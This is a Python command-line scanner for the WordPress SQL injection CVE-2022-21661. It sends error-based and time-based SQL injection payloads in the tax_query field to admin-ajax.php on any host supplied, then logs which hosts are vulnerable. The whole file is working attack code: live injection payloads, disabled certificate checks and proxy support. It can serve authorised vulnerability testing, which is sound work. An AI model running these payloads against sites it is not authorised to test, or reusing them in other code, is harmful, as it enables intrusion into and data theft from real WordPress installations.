import os
import time
import random
import hashlib
import requests
from datetime import datetime
import argparse
import urllib3
urllib3.disable_warnings()

class WordPressScanner:
    def __init__(self, host, port, ssl_support, proxy, path):
        self.abs_path = ""
        self.stamp = False
        self.host = host
        self.port = port
        self.path = path
        self.ssl_support = ssl_support
        self.proxy = proxy
        self.init()

    def init(self):
        files = os.path.abspath(__file__)
        path = os.path.dirname(files)
        self.abs_path = os.path.join(path, datetime.now().strftime("%Y%m%d%H%M%S") + ".log")

    def r0(self, session):
        url = f"{self.get_protocol()}://{self.host}:{self.port}{self.path}"
        resp = session.get(url, proxies=self.get_proxy(), verify=False)
        if resp.status_code == 400 and '0' in resp.text:
            return True
        return False

    def r1(self, session):
        rand_num = self.rand_int()
        payload = f'action=test&data={{"tax_query":{{"0":{{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5({rand_num}),0x5e))#"]}}}}}}'
        resp = self.payload(payload, session)
        if resp.status_code == 200 and self.md5b16(rand_num) in resp.text:
            return True
        return False

    def r2(self, session):
        payload = 'action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(1))#"]}}}'
        resp = self.payload(payload, session)
        if resp.status_code == 200 and resp.elapsed.total_seconds() > 1:
            return True
        return False

    def payload(self, payload, session):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
        }
        url = f"{self.get_protocol()}://{self.host}:{self.port}{self.path}"
        resp = session.post(url, headers=headers, data=payload, verify=False, proxies=self.get_proxy())
        return resp

    def get_protocol(self):
        return "https" if self.ssl_support else "http"

    def get_proxy(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    def scan(self):
        if self.stamp:
            print("Done")
        session = requests.Session()
        try:
            r0 = self.r0(session)
            if r0:
                r1 = self.r1(session)
                if r1:
                    print(f"[INFO]:[{self.host}] WordPress CVE-2022-21661 Existent")
                    self.scan_logs()
                else:
                    r2 = self.r2(session)
                    if r2:
                        print(f"[INFO]:[{self.host}] WordPress CVE-2022-21661 Existent")
                        self.scan_logs()
                    else:
                        print(f"[INFO]:[{self.host}] WordPress CVE-2022-21661 Non-existent")
            else:
                print(f"[INFO]:[{self.host}] WordPress CVE-2022-21661 Non-existent")
        except Exception as e:
            print(f"[ERROR]: {e}")
        finally:
            session.close()

    def rand_int(self):
        r1 = random.randint(0, 100000)
        r2 = random.randint(0, 100000)
        return str(r1 + r2)

    def md5b16(self, rand_num):
        md5b32 = hashlib.md5(rand_num.encode()).hexdigest()
        return md5b32[8:24]

    def scan_logs(self):
        with open(self.abs_path, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [INFO]:[{self.host}] WordPress CVE-2022-21661 Existent\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPress Scanner for CVE-2022-21661")
    parser.add_argument("-H", "--host", required=True, help="Host or IP address")
    parser.add_argument("-p", "--port", type=int, help="Port number")
    parser.add_argument("-ssl", "--ssl_support", action="store_true", help="Support SSL/TLS")
    parser.add_argument("-proxy", "--proxy", help="Proxy address (e.g., http://localhost:8080/)")
    parser.add_argument("-path", "--path", type=str, default="/wp-admin/admin-ajax.php", help="Custom path for validation, default: /wp-admin/admin-ajax.php")

    args = parser.parse_args()

    port = args.port if args.port is not None else 443 if args.ssl_support else 80
    scanner = WordPressScanner(args.host, port, args.ssl_support, args.proxy, args.path)
    scanner.scan()
